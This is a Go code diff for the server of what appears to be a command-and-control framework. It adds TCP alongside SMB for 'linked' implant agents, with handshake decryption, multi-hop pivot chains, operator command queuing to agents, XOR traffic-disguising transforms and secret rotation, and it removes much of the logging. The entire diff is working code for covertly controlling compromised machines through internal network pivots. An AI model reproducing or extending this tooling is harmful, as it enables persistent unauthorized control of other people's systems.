@@ -20,6 +20,7 @@ import (
 	"encoding/pem"
 	"fmt"
 	"log"
+	"strings"
 	"sync"
 	"time"
 )
@@ -81,23 +82,36 @@ func NewLinkRouting(db *sql.DB) (*LinkRouting, error) {
 }
 
 // RegisterLink registers a new link routing entry
-func (lr *LinkRouting) RegisterLink(edgeClientID, routingID, linkedClientID, linkType, smbProfile, smbXorKey string) error {
+// Supports both SMB and TCP links - populates the appropriate profile/xorKey columns based on linkType
+func (lr *LinkRouting) RegisterLink(edgeClientID, routingID, linkedClientID, linkType, profile, xorKey string) error {
 	lr.mu.Lock()
 	defer lr.mu.Unlock()
 
+	// Populate the appropriate columns based on link type
+	var smbProfile, smbXorKey, tcpProfile, tcpXorKey interface{}
+	if linkType == "tcp" {
+		tcpProfile = profile
+		tcpXorKey = xorKey
+		smbProfile = nil
+		smbXorKey = nil
+	} else {
+		smbProfile = profile
+		smbXorKey = xorKey
+		tcpProfile = nil
+		tcpXorKey = nil
+	}
+
 	_, err := lr.db.Exec(`
-		INSERT INTO link_routing (edge_clientID, routing_id, linked_clientID, link_type, smb_profile, smb_xor_key, created_at, last_seen, status)
-		VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 'active')
+		INSERT INTO link_routing (edge_clientID, routing_id, linked_clientID, link_type, smb_profile, smb_xor_key, tcp_profile, tcp_xor_key, created_at, last_seen, status)
+		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 'active')
 		ON CONFLICT (edge_clientID, routing_id)
-		DO UPDATE SET linked_clientID = $3, link_type = $4, smb_profile = $5, smb_xor_key = $6, last_seen = CURRENT_TIMESTAMP, status = 'active'`,
-		edgeClientID, routingID, linkedClientID, linkType, smbProfile, smbXorKey)
+		DO UPDATE SET linked_clientID = $3, link_type = $4, smb_profile = $5, smb_xor_key = $6, tcp_profile = $7, tcp_xor_key = $8, last_seen = CURRENT_TIMESTAMP, status = 'active'`,
+		edgeClientID, routingID, linkedClientID, linkType, smbProfile, smbXorKey, tcpProfile, tcpXorKey)
 
 	if err != nil {
 		return fmt.Errorf("failed to register link: %w", err)
 	}
 
-	log.Printf("[LinkRouting] Registered link: edge=%s, routing=%s -> linked=%s (%s, profile=%s, xorKey=%v)",
-		edgeClientID, routingID, linkedClientID, linkType, smbProfile, smbXorKey != "")
 	return nil
 }
 
@@ -163,14 +177,7 @@ func (lr *LinkRouting) DisconnectLink(edgeClientID, routingID string) (string, e
 		WHERE newclientID = $1`,
 		linkedClientID)
 
-	if err != nil {
-		log.Printf("[LinkRouting] Warning: Failed to clear parent relationship for %s: %v", linkedClientID, err)
-		// Don't return error here - the link is already disconnected
-	}
-
-	log.Printf("[LinkRouting] Disconnected link: edge=%s, routing=%s, linked=%s (parent cleared)",
-		edgeClientID, routingID, linkedClientID)
-	return linkedClientID, nil
+	return linkedClientID, err
 }
 
 // StorePendingHandshakeResponse stores a handshake response to be sent to an edge agent
@@ -178,7 +185,6 @@ func (lr *LinkRouting) StorePendingHandshakeResponse(edgeClientID string, respon
 	lr.mu.Lock()
 	defer lr.mu.Unlock()
 	lr.pendingHandshakeResponses[edgeClientID] = append(lr.pendingHandshakeResponses[edgeClientID], response)
-	log.Printf("[LinkRouting] Stored pending handshake response for edge %s, routing %s", edgeClientID, response.RoutingID)
 }
 
 // GetPendingHandshakeResponses retrieves and clears pending handshake responses for an edge agent
@@ -240,7 +246,6 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 	for _, item := range linkData {
 		itemMap, ok := item.(map[string]interface{})
 		if !ok {
-			log.Printf("[LinkData] Invalid link data item format")
 			continue
 		}
 
@@ -248,7 +253,6 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 		payload, _ := itemMap[cfg.PayloadField].(string)
 
 		if routingID == "" || payload == "" {
-			log.Printf("[LinkData] Missing routing_id or payload in link data")
 			continue
 		}
 
@@ -257,19 +261,14 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 		linkedClientID, err := m.linkRouting.ResolveRoutingID(edgeClientID, routingID)
 		if err != nil {
 			// Unknown routing ID - this is likely a new handshake
-			log.Printf("[LinkData] Unknown routing ID %s, treating as handshake", routingID)
-
-			// Process as a handshake
 			response, err := m.processLinkHandshake(ctx, edgeClientID, itemMap)
 			if err != nil {
-				log.Printf("[LinkData] Failed to process as handshake: %v", err)
+				log.Printf("[LinkData] Failed to process handshake: %v", err)
 				continue
 			}
 
-			// Store the handshake response to be sent back
 			if response != nil {
 				m.storeLinkHandshakeResponse(edgeClientID, response)
-				log.Printf("[LinkData] Handshake processed, response queued for routing_id %s", routingID)
 			}
 			continue
 		}
@@ -281,9 +280,9 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 			continue
 		}
 
-		// Get SMB profile and XOR key for this agent to determine if transforms were applied
-		smbProfile := m.getSMBProfileForAgent(linkedClientID)
-		smbXorKey := m.getSMBXorKeyForAgent(linkedClientID)
+		// Get profile and XOR key for this agent to determine if transforms were applied
+		linkProfile := m.getProfileForAgent(linkedClientID)
+		linkXorKey := m.getXorKeyForAgent(linkedClientID)
 
 		// Extract padding lengths if present (for transform reversal)
 		prependLen := 0
@@ -304,14 +303,12 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 
 		// Reverse transforms if profile has transforms
 		var encryptedPayload string
-		if smbProfile != nil && smbProfile.Data != nil && len(smbProfile.Data.Transforms) > 0 {
-			// Reverse transforms to get JSON envelope, then extract encrypted payload
-			encryptedPayload, err = reversePipeTransforms(rawPayload, smbProfile, prependLen, appendLen, smbXorKey)
+		if linkProfile != nil && linkProfile.Data != nil && len(linkProfile.Data.Transforms) > 0 {
+			encryptedPayload, err = reversePipeTransforms(rawPayload, linkProfile, prependLen, appendLen, linkXorKey)
 			if err != nil {
-				log.Printf("[LinkData] Failed to reverse SMB transforms for %s: %v", linkedClientID, err)
+				log.Printf("[LinkData] Failed to reverse transforms for %s: %v", linkedClientID, err)
 				continue
 			}
-			log.Printf("[LinkData] Reversed transforms for %s (pre=%d, app=%d)", linkedClientID, prependLen, appendLen)
 		} else {
 			// Legacy mode - no transforms, parse JSON envelope directly
 			var envelope struct {
@@ -319,7 +316,6 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 				Payload string `json:"payload"`
 			}
 			if err := json.Unmarshal(rawPayload, &envelope); err != nil {
-				// Might be legacy format where payload is already the encrypted data
 				encryptedPayload = payload
 			} else {
 				encryptedPayload = envelope.Payload
@@ -329,83 +325,64 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 		// Decrypt the payload with the linked agent's secret
 		decryptedPayload, err := decryptLinkedPayload(encryptedPayload, linkedConn.Secret1)
 		if err != nil {
-			log.Printf("[LinkData] Failed to decrypt linked payload: %v", err)
+			log.Printf("[LinkData] Failed to decrypt linked payload for %s: %v", linkedClientID, err)
 			continue
 		}
 
-		// DEBUG: Log the decrypted payload to see what we received
-		log.Printf("[LinkData] DEBUG: Decrypted payload from linked agent %s: %s", linkedClientID, string(decryptedPayload))
-
 		// Parse the decrypted payload - now includes potential nested link data
 		var linkedData struct {
-			AgentID            string                   `json:"agent_id"`
-			Results            []map[string]interface{} `json:"results"`
-			NestedLinkData     []interface{}            `json:"ld"` // Link data from grandchild agents
-			UnlinkNotifications []interface{}           `json:"lu"` // Unlink notifications from children
+			AgentID             string                   `json:"agent_id"`
+			Results             []map[string]interface{} `json:"results"`
+			NestedLinkData      []interface{}            `json:"ld"` // Link data from grandchild agents
+			NestedLinkHandshake map[string]interface{}   `json:"lh"` // Handshake from newly linked grandchild agent
+			UnlinkNotifications []interface{}            `json:"lu"` // Unlink notifications from children
 		}
 		if err := json.Unmarshal(decryptedPayload, &linkedData); err != nil {
 			log.Printf("[LinkData] Failed to parse linked payload: %v", err)
 			continue
 		}
 
-		// DEBUG: Log the parsed results
-		log.Printf("[LinkData] DEBUG: Parsed %d results from linked agent, %d nested link items, %d unlink notifications",
-			len(linkedData.Results), len(linkedData.NestedLinkData), len(linkedData.UnlinkNotifications))
-		for i, result := range linkedData.Results {
-			log.Printf("[LinkData] DEBUG: Result[%d]: command=%v, output_length=%d, exit_code=%v",
-				i, result["command"], len(fmt.Sprintf("%v", result["output"])), result["exit_code"])
-		}
-
 		// Process the linked agent's results
 		if err := m.processResults(ctx, tx, linkedClientID, linkedData.Results); err != nil {
-			log.Printf("[LinkData] Failed to process linked results: %v", err)
+			log.Printf("[LinkData] Failed to process linked results for %s: %v", linkedClientID, err)
 			continue
 		}
 
 		// RECURSIVE: Process nested link data from grandchild agents
-		// This enables multi-hop chains: HTTPS -> SMB -> SMB -> SMB
 		if len(linkedData.NestedLinkData) > 0 {
-			log.Printf("[LinkData] Processing %d nested link data items from %s (multi-hop chain)",
-				len(linkedData.NestedLinkData), linkedClientID)
 			if err := m.processLinkData(ctx, tx, linkedClientID, linkedData.NestedLinkData); err != nil {
 				log.Printf("[LinkData] Failed to process nested link data: %v", err)
-				// Don't fail the entire operation - continue with this agent's data
+			}
+		}
+
+		// Process nested link handshake from grandchild agent
+		if linkedData.NestedLinkHandshake != nil && len(linkedData.NestedLinkHandshake) > 0 {
+			response, err := m.processLinkHandshake(ctx, linkedClientID, linkedData.NestedLinkHandshake)
+			if err != nil {
+				log.Printf("[LinkData] Nested link handshake failed: %v", err)
+			} else if response != nil {
+				m.storeLinkHandshakeResponse(linkedClientID, response)
 			}
 		}
 
 		// Process unlink notifications from child agents
 		if len(linkedData.UnlinkNotifications) > 0 {
-			log.Printf("[LinkData] Processing %d unlink notifications from %s",
-				len(linkedData.UnlinkNotifications), linkedClientID)
 			m.processUnlinkNotifications(ctx, linkedClientID, linkedData.UnlinkNotifications)
 		}
 
 		// Rotate the linked agent's secrets
 		if err := m.rotateLinkedSecrets(linkedConn); err != nil {
-			log.Printf("[LinkData] Failed to rotate linked secrets: %v", err)
+			log.Printf("[LinkData] Failed to rotate secrets: %v", err)
 		}
 
-		// Update last seen in link_routing table
+		// Update last seen
 		m.linkRouting.UpdateLastSeen(edgeClientID, routingID)
-
-		// Update last seen in connections table for the linked agent
-		_, err = tx.ExecContext(ctx, `
-			UPDATE connections SET lastSEEN = CURRENT_TIMESTAMP WHERE newclientID = $1`,
-			linkedClientID)
-		if err != nil {
-			log.Printf("[LinkData] Warning: Failed to update lastSEEN for linked agent %s: %v", linkedClientID, err)
-		}
+		tx.ExecContext(ctx, `UPDATE connections SET lastSEEN = CURRENT_TIMESTAMP WHERE newclientID = $1`, linkedClientID)
 
 		// Broadcast last seen update to websocket clients
 		if m.commandBuffer != nil {
-			if err := m.commandBuffer.BroadcastLastSeen(linkedClientID, time.Now().Unix()); err != nil {
-				log.Printf("[LinkData] Warning: Failed to broadcast last seen for linked agent %s: %v", linkedClientID, err)
-			} else {
-				log.Printf("[LinkData] Broadcast last seen for linked agent %s", linkedClientID)
-			}
+			m.commandBuffer.BroadcastLastSeen(linkedClientID, time.Now().Unix())
 		}
-
-		log.Printf("[LinkData] Processed data from linked agent %s via edge %s", linkedClientID, edgeClientID)
 	}
 
 	return nil
@@ -419,7 +396,6 @@ func (m *Manager) processUnlinkNotifications(ctx context.Context, edgeClientID s
 		var err error
 		m.linkRouting, err = NewLinkRouting(m.db)
 		if err != nil {
-			log.Printf("[UnlinkNotification] Failed to initialize link routing: %v", err)
 			return
 		}
 	}
@@ -427,32 +403,22 @@ func (m *Manager) processUnlinkNotifications(ctx context.Context, edgeClientID s
 	for _, item := range unlinkData {
 		routingID, ok := item.(string)
 		if !ok {
-			log.Printf("[UnlinkNotification] Invalid routing ID format")
 			continue
 		}
 
-		// Disconnect the link and get the linked client ID
 		linkedClientID, err := m.linkRouting.DisconnectLink(edgeClientID, routingID)
 		if err != nil {
-			log.Printf("[UnlinkNotification] Failed to disconnect link %s: %v", routingID, err)
 			continue
 		}
-
-		log.Printf("[UnlinkNotification] Disconnected link: edge=%s, routing=%s, linked=%s",
-			edgeClientID, routingID, linkedClientID)
 
 		// Broadcast the unlink event to websocket clients
 		if m.commandBuffer != nil {
-			if err := m.commandBuffer.BroadcastLinkUpdate(linkedClientID, "", ""); err != nil {
-				log.Printf("[UnlinkNotification] Warning: Failed to broadcast unlink for %s: %v", linkedClientID, err)
-			} else {
-				log.Printf("[UnlinkNotification] Broadcast unlink for agent %s", linkedClientID)
-			}
+			m.commandBuffer.BroadcastLinkUpdate(linkedClientID, "", "")
 		}
 	}
 }
 
-// processLinkHandshake handles a new link handshake from an SMB agent
+// processLinkHandshake handles a new link handshake from an SMB or TCP agent
 func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string, handshake map[string]interface{}) (*LinkCommandItem, error) {
 	if m.linkRouting == nil {
 		var err error
@@ -470,8 +436,6 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 	if routingID == "" || payload == "" {
 		return nil, fmt.Errorf("missing routing_id or payload in handshake")
 	}
-
-	log.Printf("[LinkHandshake] Processing handshake from routing_id=%s via edge=%s", routingID, edgeClientID)
 
 	// The payload is RSA+AES encrypted just like a normal handshake
 	// We need to find the init data by trying to decrypt with known init secrets
@@ -497,7 +461,7 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 	var matchedInit *InitData
 	var decryptedSysInfo []byte
 
-	for clientID, initData := range m.initData {
+	for _, initData := range m.initData {
 		// Reconstruct the JSON for DecryptDoubleEncrypted
 		envelopeJSON, _ := json.Marshal(envelope)
 		decrypted, err := DecryptDoubleEncrypted(
@@ -512,13 +476,21 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 		// Successfully decrypted - this is our agent
 		matchedInit = initData
 		decryptedSysInfo = []byte(decrypted)
-		log.Printf("[LinkHandshake] Matched init data for clientID=%s", clientID)
 		break
 	}
 
 	if matchedInit == nil {
 		return nil, fmt.Errorf("no matching init data found for handshake")
 	}
+
+	// Determine link type from init data - supports both SMB and TCP
+	// Note: matchedInit.Type is "link" for all link payloads
+	// matchedInit.Protocol contains the actual protocol: "SMB" or "TCP"
+	protocolUpper := strings.ToUpper(matchedInit.Protocol) // "SMB" or "TCP"
+	if protocolUpper == "" {
+		protocolUpper = "SMB" // Default to SMB for backwards compatibility
+	}
+	linkType := strings.ToLower(protocolUpper) // "smb" or "tcp"
 
 	// Parse the system info
 	var sysInfo SystemInfo
@@ -537,16 +509,17 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 		extIP = fmt.Sprintf("via:%s", edgeClientID[:8])
 	}
 
-	// Check if this SMB agent already exists (reconnection scenario)
-	// Match by clientID (init ID) and protocol SMB, hostname, and process name
+	// Check if this linked agent already exists (reconnection scenario)
+	// Match by clientID (init ID), protocol (SMB/TCP), hostname, and process name
 	var existingClientID string
 	err = m.db.QueryRowContext(ctx, `
 		SELECT newclientID FROM connections
-		WHERE clientID = $1 AND protocol = 'SMB'
-		AND hostname = $2 AND process = $3
+		WHERE clientID = $1 AND protocol = $2
+		AND hostname = $3 AND process = $4
 		AND deleted_at IS NULL
 		LIMIT 1`,
 		matchedInit.ClientID,
+		protocolUpper,
 		sysInfo.AgentInfo.Hostname,
 		sysInfo.AgentInfo.ProcessName,
 	).Scan(&existingClientID)
@@ -555,37 +528,39 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 	var isReconnect bool
 
 	if err == nil && existingClientID != "" {
-		// Existing SMB agent found - update it instead of creating new
+		// Existing linked agent found - update it instead of creating new
 		isReconnect = true
 		newClientID = existingClientID
-		log.Printf("[LinkHandshake] Reconnecting existing SMB agent %s to new parent %s", newClientID, edgeClientID)
 
-		// Update the existing connection with new secrets and parent
+		// Update the existing connection with new secrets, parent, and link_type
 		_, err = m.db.ExecContext(ctx, `
 			UPDATE connections SET
 				secret1 = $1, secret2 = $2,
 				extIP = $3, parent_clientID = $4,
 				lastSEEN = CURRENT_TIMESTAMP,
-				pid = $5
-			WHERE newclientID = $6`,
+				pid = $5, link_type = $6
+			WHERE newclientID = $7`,
 			secret1, secret2,
 			extIP, edgeClientID,
 			fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
+			linkType, // Ensure link_type is set/updated on reconnect
 			newClientID,
 		)
 		if err != nil {
 			return nil, fmt.Errorf("failed to update linked connection: %w", err)
 		}
 
-		// Update active connections with new secrets
-		m.activeConnections.AddConnection(&ActiveConnection{
+		// Update active connections with new secrets (must use UpdateConnection for existing connections)
+		if err := m.activeConnections.UpdateConnection(&ActiveConnection{
 			ClientID: newClientID,
-			Protocol: "SMB",
+			Protocol: protocolUpper,
 			Secret1:  secret1,
 			Secret2:  secret2,
-		})
+		}); err != nil {
+			log.Printf("[WARN] Failed to update active connection for reconnecting agent %s: %v", newClientID, err)
+		}
 	} else {
-		// New SMB agent - create new entry
+		// New linked agent - create new entry
 		isReconnect = false
 		newClientID = generateNewClientID()
 
@@ -604,7 +579,7 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 			)`,
 			newClientID,
 			matchedInit.ClientID,
-			"SMB",
+			protocolUpper, // Dynamic: "SMB" or "TCP"
 			secret1,
 			secret2,
 			extIP,
@@ -616,47 +591,53 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 			fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
 			sysInfo.AgentInfo.Arch,
 			sysInfo.AgentInfo.OS,
-			"SMB",
+			protocolUpper, // Dynamic: "SMB" or "TCP"
 			edgeClientID,
-			"smb",
-			1, // hop_count = 1 for direct link
+			linkType, // Dynamic: "smb" or "tcp"
+			1,        // hop_count = 1 for direct link
 		)
 		if err != nil {
 			return nil, fmt.Errorf("failed to store linked connection: %w", err)
 		}
 
 		// Add to active connections
-		m.activeConnections.AddConnection(&ActiveConnection{
+		if err := m.activeConnections.AddConnection(&ActiveConnection{
 			ClientID: newClientID,
-			Protocol: "SMB",
+			Protocol: protocolUpper,
 			Secret1:  secret1,
 			Secret2:  secret2,
-		})
+		}); err != nil {
+			log.Printf("[WARN] Failed to add active connection for new linked agent %s: %v", newClientID, err)
+		}
 	}
 
-	// Register the link routing with SMB profile and XOR key from init data
-	smbProfile := ""
-	smbXorKey := ""
+	// Register the link routing with profile and XOR key from init data
+	// Use appropriate profile/key based on link type (SMB or TCP)
+	profile := ""
+	xorKey := ""
 	if matchedInit != nil {
-		smbProfile = matchedInit.SMBProfile
-		smbXorKey = matchedInit.SMBXorKey
+		if linkType == "tcp" {
+			profile = matchedInit.TCPProfile
+			xorKey = matchedInit.TCPXorKey
+		} else {
+			profile = matchedInit.SMBProfile
+			xorKey = matchedInit.SMBXorKey
+		}
 	}
-	if err := m.linkRouting.RegisterLink(edgeClientID, routingID, newClientID, "smb", smbProfile, smbXorKey); err != nil {
+	if err := m.linkRouting.RegisterLink(edgeClientID, routingID, newClientID, linkType, profile, xorKey); err != nil {
 		return nil, fmt.Errorf("failed to register link: %w", err)
 	}
 
 	if isReconnect {
 		// Broadcast link_update for reconnection (re-parenting existing agent)
-		if err := m.commandBuffer.BroadcastLinkUpdate(newClientID, edgeClientID, "smb"); err != nil {
-			log.Printf("[LinkHandshake] Warning: Failed to broadcast link update: %v", err)
-		}
-		log.Printf("[LinkHandshake] Successfully re-linked existing agent %s to edge %s", newClientID, edgeClientID)
+		m.commandBuffer.BroadcastLinkUpdate(newClientID, edgeClientID, linkType)
+		log.Printf("[LINK] %s agent %s re-linked to %s", protocolUpper, newClientID[:8], edgeClientID[:8])
 	} else {
 		// Notify websocket service about the new linked agent
 		notification := &pb.ConnectionNotification{
 			NewClientId:    newClientID,
 			ClientId:       matchedInit.ClientID,
-			Protocol:       "SMB",
+			Protocol:       protocolUpper, // Dynamic: "SMB" or "TCP"
 			Secret1:        secret1,
 			Secret2:        secret2,
 			ExtIp:          extIP,
@@ -667,16 +648,14 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 			Pid:            fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
 			Arch:           sysInfo.AgentInfo.Arch,
 			Os:             sysInfo.AgentInfo.OS,
-			Proto:          "SMB",
+			Proto:          protocolUpper, // Dynamic: "SMB" or "TCP"
 			LastSeen:       time.Now().Unix(),
 			ParentClientId: edgeClientID, // Link parent info for UI hierarchy
-			LinkType:       "smb",
+			LinkType:       linkType,     // Dynamic: "smb" or "tcp"
 		}
 
-		if err := m.notifyWebsocketService(notification); err != nil {
-			log.Printf("[LinkHandshake] Warning: Failed to notify websocket service: %v", err)
-		}
-		log.Printf("[LinkHandshake] Successfully registered new linked agent %s via edge %s", newClientID, edgeClientID)
+		m.notifyWebsocketService(notification)
+		log.Printf("[LINK] New %s agent %s connected via %s", protocolUpper, newClientID[:8], edgeClientID[:8])
 	}
 
 	// Create signed response (same as normal handshake)
@@ -750,14 +729,11 @@ func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommand
 		}
 
 		// Skip if this routing ID has a pending handshake response
-		// The SMB agent needs to receive the handshake response before any commands
 		if pendingRoutingIDs[routingID] {
-			log.Printf("[LinkCommands] Skipping commands for %s - handshake not yet delivered", linkedClientID)
 			continue
 		}
 
 		// Get pending commands for this linked agent
-		// GetCommand returns []string with a single JSON-encoded string of commands
 		pendingCmds, hasCommands := m.commandBuffer.GetCommand(linkedClientID)
 
 		// MULTI-HOP: Also get commands and handshake responses for this agent's children
@@ -779,7 +755,6 @@ func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommand
 		var payload map[string]interface{}
 
 		if hasCommands && len(pendingCmds) > 0 {
-			// Parse the commands JSON first
 			var cmds []interface{}
 			if err := json.Unmarshal([]byte(pendingCmds[0]), &cmds); err == nil {
 				payload = map[string]interface{}{
@@ -794,7 +769,6 @@ func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommand
 				payload = make(map[string]interface{})
 			}
 			payload["lr"] = nestedHandshakes
-			log.Printf("[LinkCommands] Including %d nested handshake responses for %s", len(nestedHandshakes), linkedClientID)
 		}
 
 		// Add nested commands (for grandchildren)
@@ -803,7 +777,6 @@ func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommand
 				payload = make(map[string]interface{})
 			}
 			payload["lc"] = nestedCommands
-			log.Printf("[LinkCommands] Including %d nested link commands for %s", len(nestedCommands), linkedClientID)
 		}
 
 		// Skip if nothing to send
@@ -814,37 +787,30 @@ func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommand
 		// Marshal the combined payload
 		cmdJSON, err := json.Marshal(payload)
 		if err != nil {
-			log.Printf("[LinkCommands] Failed to marshal payload for %s: %v", linkedClientID, err)
 			continue
 		}
 
 		encryptedPayload, err := encryptForLinkedAgent(cmdJSON, linkedConn.Secret1)
 		if err != nil {
-			log.Printf("[LinkCommands] Failed to encrypt for %s: %v", linkedClientID, err)
 			continue
 		}
 
-		// Get SMB profile and XOR key for this linked agent
-		smbProfile := m.getSMBProfileForAgent(linkedClientID)
-		smbXorKey := m.getSMBXorKeyForAgent(linkedClientID)
+		// Get profile and XOR key for this linked agent (auto-detects SMB vs TCP)
+		linkProfile := m.getProfileForAgent(linkedClientID)
+		linkXorKey := m.getXorKeyForAgent(linkedClientID)
 
 		// Check if we should use transforms or legacy mode
-		if smbProfile == nil || smbProfile.Data == nil || len(smbProfile.Data.Transforms) == 0 {
+		if linkProfile == nil || linkProfile.Data == nil || len(linkProfile.Data.Transforms) == 0 {
 			// Legacy mode - just send the encrypted payload
-			// The HTTPS agent will wrap it in JSON envelope {"type":"data","payload":"..."}
 			commands = append(commands, LinkCommandItem{
 				RoutingID:   routingID,
 				Payload:     encryptedPayload,
 				Transformed: false,
 			})
-			log.Printf("[LinkCommands] Prepared commands for linked agent %s (routing=%s, legacy mode)",
-				linkedClientID, routingID)
 		} else {
 			// Transforms mode - wrap in JSON envelope and apply transforms
-			// The server creates the full message, HTTPS agent just relays raw bytes
-			transformedData, prependLen, appendLen, err := applyPipeTransforms(encryptedPayload, smbProfile, smbXorKey)
+			transformedData, prependLen, appendLen, err := applyPipeTransforms(encryptedPayload, linkProfile, linkXorKey)
 			if err != nil {
-				log.Printf("[LinkCommands] Failed to apply SMB transforms for %s: %v, falling back to legacy", linkedClientID, err)
 				// Fall back to legacy mode
 				commands = append(commands, LinkCommandItem{
 					RoutingID:   routingID,
@@ -854,7 +820,6 @@ func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommand
 				continue
 			}
 
-			// Base64 encode the transformed data for transport
 			commands = append(commands, LinkCommandItem{
 				RoutingID:     routingID,
 				Payload:       base64.StdEncoding.EncodeToString(transformedData),
@@ -862,8 +827,6 @@ func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommand
 				AppendLength:  appendLen,
 				Transformed:   true,
 			})
-			log.Printf("[LinkCommands] Prepared commands for linked agent %s (routing=%s, transforms mode)",
-				linkedClientID, routingID)
 		}
 	}
 
@@ -990,7 +953,6 @@ func (m *Manager) storeLinkHandshakeResponse(edgeClientID string, response *Link
 		var err error
 		m.linkRouting, err = NewLinkRouting(m.db)
 		if err != nil {
-			log.Printf("[LinkRouting] Failed to initialize for storing response: %v", err)
 			return
 		}
 	}
@@ -1029,11 +991,7 @@ func (m *Manager) getPendingLinkResponsesSeparate(edgeClientID string) (handshak
 	}
 
 	// Get commands for linked agents
-	commands, err = m.getCommandsForLinkedAgents(edgeClientID)
-	if err != nil {
-		log.Printf("[LinkRouting] Failed to get commands for linked agents: %v", err)
-		err = nil // Don't fail completely, just log the warning
-	}
+	commands, _ = m.getCommandsForLinkedAgents(edgeClientID)
 
 	return handshakes, commands, nil
 }
@@ -1079,11 +1037,93 @@ func signWithRSAKey(data []byte, rsaKeyBase64 string) ([]byte, error) {
 }
 
 // =============================================================================
-// SMB TRANSFORM HELPERS
+// LINK TRANSFORM HELPERS
 // =============================================================================
 
-// getSMBProfileForAgent returns the SMB profile to use for a linked agent
-// TODO: In Phase 5+, this will look up the profile name from the agent's registration
+// getLinkTypeForAgent returns the link type (smb or tcp) for a linked agent
+func (m *Manager) getLinkTypeForAgent(linkedClientID string) string {
+	var linkType sql.NullString
+	err := m.db.QueryRow(`
+		SELECT link_type FROM link_routing
+		WHERE linked_clientID = $1 AND status = 'active'
+		LIMIT 1`,
+		linkedClientID).Scan(&linkType)
+
+	if err != nil || !linkType.Valid || linkType.String == "" {
+		// Default to SMB for backwards compatibility
+		return "smb"
+	}
+	return linkType.String
+}
+
+// getProfileForAgent returns the transform profile for a linked agent (SMB or TCP)
+func (m *Manager) getProfileForAgent(linkedClientID string) *config.SMBProfile {
+	linkType := m.getLinkTypeForAgent(linkedClientID)
+	if linkType == "tcp" {
+		return m.getTCPProfileForAgent(linkedClientID)
+	}
+	return m.getSMBProfileForAgent(linkedClientID)
+}
+
+// getXorKeyForAgent returns the XOR key for a linked agent (SMB or TCP)
+func (m *Manager) getXorKeyForAgent(linkedClientID string) string {
+	linkType := m.getLinkTypeForAgent(linkedClientID)
+	if linkType == "tcp" {
+		return m.getTCPXorKeyForAgent(linkedClientID)
+	}
+	return m.getSMBXorKeyForAgent(linkedClientID)
+}
+
+// getTCPProfileForAgent returns the TCP profile to use for a linked agent
+func (m *Manager) getTCPProfileForAgent(linkedClientID string) *config.SMBProfile {
+	if m.linkRouting == nil || m.linkRouting.config == nil {
+		return nil
+	}
+
+	// Look up the TCP profile name from the link_routing table
+	var profileName sql.NullString
+	err := m.db.QueryRow(`
+		SELECT tcp_profile FROM link_routing
+		WHERE linked_clientID = $1 AND status = 'active'
+		LIMIT 1`,
+		linkedClientID).Scan(&profileName)
+
+	if err != nil || !profileName.Valid || profileName.String == "" {
+		return nil
+	}
+
+	profile := m.linkRouting.config.GetSMBProfile(profileName.String)
+	return profile
+}
+
+// getTCPXorKeyForAgent returns the per-build XOR key for a TCP linked agent
+func (m *Manager) getTCPXorKeyForAgent(linkedClientID string) string {
+	// Try link_routing table first (for connected TCP agents)
+	var xorKey sql.NullString
+	err := m.db.QueryRow(`
+		SELECT tcp_xor_key FROM link_routing
+		WHERE linked_clientID = $1 AND status = 'active'
+		LIMIT 1`,
+		linkedClientID).Scan(&xorKey)
+
+	if err == nil && xorKey.Valid && xorKey.String != "" {
+		return xorKey.String
+	}
+
+	// Fall back to inits table via connections lookup
+	err = m.db.QueryRow(`
+		SELECT i.tcp_xor_key FROM inits i
+		INNER JOIN connections c ON c.clientID = i.clientID::text
+		WHERE c.newclientID = $1`,
+		linkedClientID).Scan(&xorKey)
+
+	if err == nil && xorKey.Valid && xorKey.String != "" {
+		return xorKey.String
+	}
+
+	return ""
+}
+
 // getSMBProfileForAgent returns the SMB profile to use for a linked agent
 func (m *Manager) getSMBProfileForAgent(linkedClientID string) *config.SMBProfile {
 	if m.linkRouting == nil || m.linkRouting.config == nil {
@@ -1099,20 +1139,10 @@ func (m *Manager) getSMBProfileForAgent(linkedClientID string) *config.SMBProfil
 		linkedClientID).Scan(&profileName)
 
 	if err != nil || !profileName.Valid || profileName.String == "" {
-		// No profile configured - use legacy mode
-		log.Printf("[SMBTransform] No SMB profile configured for agent %s, using legacy mode", linkedClientID)
 		return nil
 	}
 
-	// Get the profile from config
 	profile := m.linkRouting.config.GetSMBProfile(profileName.String)
-	if profile == nil {
-		log.Printf("[SMBTransform] SMB profile '%s' not found in config for agent %s, using legacy mode",
-			profileName.String, linkedClientID)
-		return nil
-	}
-
-	log.Printf("[SMBTransform] Using SMB profile '%s' for agent %s", profileName.String, linkedClientID)
